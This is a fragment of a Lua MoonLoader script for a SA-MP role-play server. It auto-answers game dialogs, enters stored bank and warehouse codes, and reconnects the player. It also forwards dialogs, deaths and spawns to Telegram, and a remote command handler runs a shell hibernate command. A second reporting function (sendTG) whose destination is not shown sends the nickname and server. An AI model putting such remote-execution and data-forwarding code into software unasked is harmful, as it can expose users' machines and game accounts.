        wait(500)
        diolog[0] = false
        sampCloseCurrentDialogWithButton(0)
    end
end

function pcoffs()
    if cmd[0] then
        os.execute('shutdown /h')
    end
end

function rec()
    if cmd[0] then
        wait(1000)
        sampDisconnectWithReason(quit)
        wait(5000)
        sampSetGamestate(1)
    end
end

function nickrecon()
    if cmd[0] then
        wait(1000)
        sampDisconnectWithReason(quit)
        wait(200)
        sampSetLocalPlayerName(mainIni.main.nickrecons)
        wait(5000)
        sampConnectToServer(mainIni.main.serverrecon, 7777)
    end
end

function getOnline()
	local countvers = 0
	for i = 0, 999 do
		if sampIsPlayerConnected(i) then
			countvers = countvers + 1
		end
	end
	return countvers
end

function sendStatusTg()
	local response = ''
	if sampGetCurrentServerName() then
		response = response .. 'Server: ' .. sampGetCurrentServerName() .. '\n'
	end
	response = response .. 'Online: ' .. getOnline() .. '\n'
	sendTelegramNotification(response)
end

function sendDialog()
	activedia = not activedia
	if activedia then 
        diolog[0] = true
        mainIni.main.diolog = diolog[0] 
		inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
    
        sendTelegramNotification('Отправка диалогов включена.')
	else
        diolog[0] = false
        mainIni.main.diolog = diolog[0] 
		inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
    
        sendTelegramNotification('Отправка диалогов отключена.')
	end
end

local dataq = {
    props = {
        [968] = true,
    },
}

function sampev.onCreateObject(id, data)
    if dataq.props[data.modelId] then
        return false
    end
end




function sampev.onDisplayGameText(style, time, text)
    if string.match(text, "ENGINE ~r~OFF") then 
        sampSendChat("/engine") 
    end
end


function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
    if title:find('{BFBBBA}{73B461}Аренда семейного авто') then 
		sampSendDialogResponse(dialogId, 1, 0, nil)
        sampSendChat('/lock')
		return false
	end
    if title:find('{BFBBBA}{73B461}Лифт') and text:find('{cccccc}Холл') then 
		sampSendDialogResponse(dialogId, 1, 1, nil)
		return false
	end
    if text:find('Удача!') then 
		sampSendDialogResponse(id, 0, _, _)
		return false
	end
    if dialogId == 25194 then
        sampSendDialogResponse(dialogId,1,1,nil) 
        return false
    end
    
    if title:find('{BFBBBA}{ff6666}Сущности рядом') then 
		sampSendDialogResponse(id, 0, _, _)
		return false
	end
    if text:find('{FFFFFF}В этом месте запрещено {FC7979}драться/стрелять{FFFFFF}.') then 
		sampSendDialogResponse(id, 0, _, _)
		return false
	end
    if text:find('На ваш {FFD450}E-MAIL{FFFFFF} было отправлено') then 
		sampSendDialogResponse(id, 0, _, _)
		return false
	end
    if dialogId == 15375 then
        sampSendDialogResponse(dialogId,1,1,nil) 
        return false
    end
    if title:find('Пароль от сервера') then 
		sendTelegramNotification('Сервер закрыт. Нужен пароль для входа')
	end
    if dialogId == 26558 then
        if checkboxkodbank[0] == true then
            sampSendDialogResponse(dialogId, 1, nil); return false 
        end
    end
    if dialogId == 26559 then
        if checkboxkodbank[0] == true then
            sampSendDialogResponse(dialogId, 1, nil, mainIni.main.kodbank); return false   
        end
    end
    if dialogId == 25202 then
        if checkboxkodsklad[0] == true then
            sampSendDialogResponse(dialogId, 1, nil, mainIni.main.kodsklad); return false     
        end
    end
    if dialogId == 1599 then
        sampSendDialogResponse(id, 0, _, _)
        sendTelegramNotification('Вы умерли!')
        sendTG('Вы умерли! '..sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))))
        return false
    end
    onShowDialogwqq = string.format("Текущая информация о диалоге:\nДиалог ID: %d \nДиалог тип: %d \nЗаголовок диалогового окна:\n%s\nТекст диалогового окна:\n%s", dialogId, style, title, text)   
    if settingslavka[0] then
        if title:find ('{BFBBBA}Выберите тип вашей лавки') then
		    sampSendDialogResponse(dialogId,1,1,nil)
            return false
	    end
        if text:find('{FFFFFF}Введите название вашей лавки') then
		    sampSendDialogResponse(dialogId, 1, nil, mainIni.main.namelavkas); return false
	    end
        if title == '{BFBBBA}Выберете цвет' and text:find('{E94E4E}|||||||||||||||||||') then
        sampSendDialogResponse(dialogId,1,15,nil)
        return false
    end
end
    if diolog[0] then
        if style == 1 or style == 3 then
	        sendTelegramNotification('' .. title .. '\n' .. text .. '\n\n[______________]\n\n[' .. button1 .. '] | [' .. button2 .. ']' )
	    else
		    if style == 0 then
		        sendTelegramNotification('' .. title .. '\n' .. text .. '\n\n[' .. button1 .. '] | [' .. button2 .. ']' )
		    else
			    sendTelegramNotification('' .. title .. '\n' .. text .. '\n\n[' .. button1 .. '] | [' .. button2 .. ']' )
            end
        end
    end 
    if button1 and button1 ~= '' and button2 and button2 ~= '' then
        button1 = '{32d137}' .. button1
        button2 = '{d0595d}' .. button2
    end
    if button1 and button1 ~= '' then
        button1 = '{d0595d}' .. button1
    end
    return { dialogId, style, title, button1, button2, text }  
end

function sampev.onSendSpawn()
    sendTelegramNotification('Персонаж под ником '..sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))..' был заспавнен.')
    local serverName = sampGetCurrentServerName()
    sendTG('Игрок был заспавнен\nНик: '..sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))..'\nСервер: '..serverName)
end

function convertDecimalToRGBA(u32, alpha)
	local a = bit.band(bit.rshift(u32, 24), 0xFF) / 0xFF
	local r = bit.band(bit.rshift(u32, 16), 0xFF) / 0xFF
	local g = bit.band(bit.rshift(u32, 8), 0xFF) / 0xFF
	local b = bit.band(u32, 0xFF) / 0xFF
	return imgui.ImVec4(r, g, b, a * (alpha or 1.0))
end

function getTheme()
	jsonConfig['script'].scriptColor = {scriptColor[0], scriptColor[1], scriptColor[2]}
	json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)

	local dec = imgui.GetColorU32Vec4(imgui.ImVec4(scriptColor[0], scriptColor[1], scriptColor[2], 1.0))
	local color = bit.tohex(bit.bswap(dec))
	local hex = ('%s'):format(color:sub(1, #color - 2))
	theme(tonumber('0x' .. hex), 1.5, true)
end

local function loadIconicFont(fontSize)
    local config = imgui.ImFontConfig()
    config.MergeMode = true
    config.PixelSnapH = true
    local iconRanges = imgui.new.ImWchar[3](ti.min_range, ti.max_range, 0)
    imgui.GetIO().Fonts:AddFontFromMemoryCompressedBase85TTF(ti.get_font_data_base85(), fontSize, config, iconRanges)
end


imgui.OnInitialize(function()
    imgui.OnInitialize(function()
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\123.png') then 
            imhandle = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\123.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\456.png') then 
            imhandle1 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\456.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_406.jpg') then 
            Vehicle_406 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_406.jpg') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_411.jpg') then 
            Vehicle_411 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_411.jpg') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_432.jpg') then 
            Vehicle_432 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_432.jpg') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_510.jpg') then 
            Vehicle_510 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_510.jpg') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_520.jpg') then 
            Vehicle_520 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_520.jpg') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_522.jpg') then 
            Vehicle_522 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_522.jpg') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_531.jpg') then 
            Vehicle_531 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_531.jpg') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_535.jpg') then 
            Vehicle_535 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_535.jpg') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_539.jpg') then 
            Vehicle_539 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_539.jpg') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_557.jpg') then 
            Vehicle_557 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_557.jpg') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_560.jpg') then 
            Vehicle_560 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_560.jpg') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Vehicle_562.jpg') then 
            Vehicle_562 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Vehicle_562.jpg') 
        end

        
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\fWTGIGc.png') then 
            WEAPON_BRASSKNUCKLE = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\fWTGIGc.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Rl2covI.png') then 
            WEAPON_GOLFCLUB = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Rl2covI.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Eq8hg4s.png') then 
            WEAPON_NITESTICK = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Eq8hg4s.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Rsef1Oa.png') then 
            WEAPON_KNIFE = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Rsef1Oa.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\J4j20Mg.png') then 
            WEAPON_BAT = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\J4j20Mg.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\PGvfdHF.png') then 
            WEAPON_SHOVEL = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\PGvfdHF.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\hF0rn6M.png') then 
            WEAPON_POOLSTICK = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\hF0rn6M.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\SLWRVUO.png') then 
            WEAPON_KATANA = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\SLWRVUO.png') 
        end

        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\0MbFCG6.png') then 
            WEAPON_CHAINSAW = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\0MbFCG6.png') 
        end
      


        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\007E9C8.png') then 
            WEAPON_DILDO = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\007E9C8.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\rjVqOn6.png') then 
            WEAPON_DILDO2 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\rjVqOn6.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\YiWnVeK.png') then 
            WEAPON_VIBRATOR = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\YiWnVeK.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\trMUD3P.png') then 
            WEAPON_VIBRATOR2 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\trMUD3P.png') 
        end


      

        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\DriLT3V.png') then 
            WEAPON_FLOWER = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\DriLT3V.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\YN6v4ls.png') then 
            WEAPON_CANE = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\YN6v4ls.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\YQXfptw.png') then 
            WEAPON_GRENADE = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\YQXfptw.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\dvjD10U.png') then 
            WEAPON_TEARGAS = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\dvjD10U.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\b0eRmEa.png') then 
            WEAPON_MOLTOV = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\b0eRmEa.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\6AsQKBc.png') then 
            WEAPON_COLT45 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\6AsQKBc.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\ijqIfT5.png') then 
            WEAPON_SILENCED = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\ijqIfT5.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\HZgCRf9.png') then 
            WEAPON_DEAGLE = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\HZgCRf9.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\D5v9GIT.png') then 
            WEAPON_SHOTGUN = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\D5v9GIT.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\4gnBHXU.png') then 
            WEAPON_SAWEDOFF = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\4gnBHXU.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\fw5kciy.png') then 
            WEAPON_SHOTGSPA = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\fw5kciy.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\wxOK47i.png') then 
            WEAPON_UZI = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\wxOK47i.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\DAhTU6M.png') then 
            WEAPON_MP5 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\DAhTU6M.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\ekJsL6d.png') then 
            WEAPON_AK47 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\ekJsL6d.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\UFlxEc8.png') then 
            WEAPON_M4 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\UFlxEc8.png') 
        end
     

        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\O7y1m1R.png') then 
            WEAPON_TEC9 = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\O7y1m1R.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\D5v9GIT.png') then 
            WEAPON_RIFLE = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\D5v9GIT.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\zYE1HCI.png') then 
            WEAPON_SNIPER = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\zYE1HCI.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\iPQF756.png') then 
            WEAPON_ROCKETLAUNCHER = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\iPQF756.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\Jt32eXt.png') then 
            WEAPON_HEATSEEKER = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\Jt32eXt.png') 
        end
        
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\rO1z5Gq.png') then 
            WEAPON_FLAMETHROWER = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\rO1z5Gq.png') 
        end

        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\kJhYmLd.png') then 
            WEAPON_MINIGUN = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\kJhYmLd.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\IktbiW5.png') then 
            WEAPON_SATCHEL = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\IktbiW5.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\LOpJCzO.png') then 
            WEAPON_SPRAYCAN = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\LOpJCzO.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\N7nLPZG.png') then 
            WEAPON_FIREEXTINGUISHER = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\N7nLPZG.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\MUdyYZS.png') then 
            WEAPON_CAMERA = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\MUdyYZS.png') 
        end
        if doesFileExist(getWorkingDirectory()..'\\config\\MiniCrHelper\\W4wfwoJ.png') then 
            WEAPON_PARACHUTE = imgui.CreateTextureFromFile(getWorkingDirectory() .. '\\config\\MiniCrHelper\\W4wfwoJ.png') 
        end
    end)

	imgui.GetIO().IniFilename = nil
	getTheme()
    
    loadIconicFont(26)
    imgui.GetIO().IniFilename = nil

	fonts = {}
	local glyph_ranges = imgui.GetIO().Fonts:GetGlyphRangesCyrillic()

	

	
    for k, v in ipairs({15, 18, 25, 30}) do
		fonts[v] = imgui.GetIO().Fonts:AddFontFromFileTTF(u8(getWorkingDirectory() .. '/ReplaceWindow/EagleSans-Regular.ttf'), v, nil, glyph_ranges)
	end

	
	logo = imgui.CreateTextureFromFile(u8(getWorkingDirectory() .. '/ReplaceWindow/ReplaceWindow.png'))
end)

function theme(color, chroma_multiplier, accurate_shades)
	imgui.SwitchContext()
	palette = monet.buildColors(color, chroma_multiplier, accurate_shades)
	local style = imgui.GetStyle()
	local colors = style.Colors
	local flags = imgui.Col

	imgui.GetStyle().WindowPadding = imgui.ImVec2(5, 5)
	imgui.GetStyle().FramePadding = imgui.ImVec2(5, 5)
	imgui.GetStyle().ItemSpacing = imgui.ImVec2(5, 5)
	imgui.GetStyle().ItemInnerSpacing = imgui.ImVec2(5, 5)
	imgui.GetStyle().TouchExtraPadding = imgui.ImVec2(0, 0)

	imgui.GetStyle().IndentSpacing = 20
	imgui.GetStyle().ScrollbarSize = 12.5
	imgui.GetStyle().GrabMinSize = 10

	imgui.GetStyle().WindowBorderSize = 0
	imgui.GetStyle().ChildBorderSize = 1
	imgui.GetStyle().PopupBorderSize = 1
	imgui.GetStyle().FrameBorderSize = 0
	imgui.GetStyle().TabBorderSize = 0

	imgui.GetStyle().WindowRounding = 3
	imgui.GetStyle().ChildRounding = 3
	imgui.GetStyle().PopupRounding = 3
	imgui.GetStyle().FrameRounding = 3
	imgui.GetStyle().ScrollbarRounding = 1.5
	imgui.GetStyle().GrabRounding = 3
	imgui.GetStyle().TabRounding = 3

	imgui.GetStyle().WindowTitleAlign = imgui.ImVec2(0.50, 0.50)

	colors[flags.Text] = convertDecimalToRGBA(palette.neutral1.color_50)
	colors[flags.TextDisabled] = convertDecimalToRGBA(palette.neutral1.color_400)
	colors[flags.WindowBg] = convertDecimalToRGBA(palette.accent2.color_900)
	colors[flags.ChildBg] = convertDecimalToRGBA(palette.accent2.color_900)
	colors[flags.PopupBg] = convertDecimalToRGBA(palette.accent2.color_900)
	colors[flags.Border] = convertDecimalToRGBA(palette.accent2.color_300)
	colors[flags.BorderShadow] = imgui.ImVec4(0, 0, 0, 0)
	colors[flags.FrameBg] = convertDecimalToRGBA(palette.accent1.color_600)
	colors[flags.FrameBgHovered] = convertDecimalToRGBA(palette.accent1.color_500)
	colors[flags.FrameBgActive] = convertDecimalToRGBA(palette.accent1.color_400)
	colors[flags.TitleBgActive] = convertDecimalToRGBA(palette.accent1.color_600)
	colors[flags.ScrollbarBg] = convertDecimalToRGBA(palette.accent2.color_800)
	colors[flags.ScrollbarGrab] = convertDecimalToRGBA(palette.accent1.color_600)
	colors[flags.ScrollbarGrabHovered] = convertDecimalToRGBA(palette.accent1.color_500)
	colors[flags.ScrollbarGrabActive] = convertDecimalToRGBA(palette.accent1.color_400)
	colors[flags.CheckMark] = convertDecimalToRGBA(palette.neutral1.color_50)
	colors[flags.SliderGrab] = convertDecimalToRGBA(palette.accent2.color_400)
	colors[flags.SliderGrabActive] = convertDecimalToRGBA(palette.accent2.color_300)
	colors[flags.Button] = convertDecimalToRGBA(palette.accent2.color_700)
	colors[flags.ButtonHovered] = convertDecimalToRGBA(palette.accent1.color_600)
	colors[flags.ButtonActive] = convertDecimalToRGBA(palette.accent1.color_500)
	colors[flags.Header] = convertDecimalToRGBA(palette.accent1.color_800)
	colors[flags.HeaderHovered] = convertDecimalToRGBA(palette.accent1.color_700)
	colors[flags.HeaderActive] = convertDecimalToRGBA(palette.accent1.color_600)
	colors[flags.Separator] = convertDecimalToRGBA(palette.accent2.color_200)
	colors[flags.SeparatorHovered] = convertDecimalToRGBA(palette.accent2.color_100)
	colors[flags.SeparatorActive] = convertDecimalToRGBA(palette.accent2.color_50)
	colors[flags.ResizeGrip] = convertDecimalToRGBA(palette.accent2.color_900)
	colors[flags.ResizeGripHovered] = convertDecimalToRGBA(palette.accent2.color_800)
	colors[flags.ResizeGripActive] = convertDecimalToRGBA(palette.accent2.color_700)
	colors[flags.Tab] = convertDecimalToRGBA(palette.accent1.color_700)
	colors[flags.TabHovered] = convertDecimalToRGBA(palette.accent1.color_600)
	colors[flags.TabActive] = convertDecimalToRGBA(palette.accent1.color_500)
	colors[flags.PlotLines] = convertDecimalToRGBA(palette.accent3.color_300)
	colors[flags.PlotLinesHovered] = convertDecimalToRGBA(palette.accent3.color_50)
	colors[flags.PlotHistogram] = convertDecimalToRGBA(palette.accent3.color_300)
	colors[flags.PlotHistogramHovered] = convertDecimalToRGBA(palette.accent3.color_50)
	colors[flags.DragDropTarget] = convertDecimalToRGBA(palette.accent1.color_100)
	colors[flags.ModalWindowDimBg] = imgui.ImVec4(0.00, 0.00, 0.00, 0.95)
end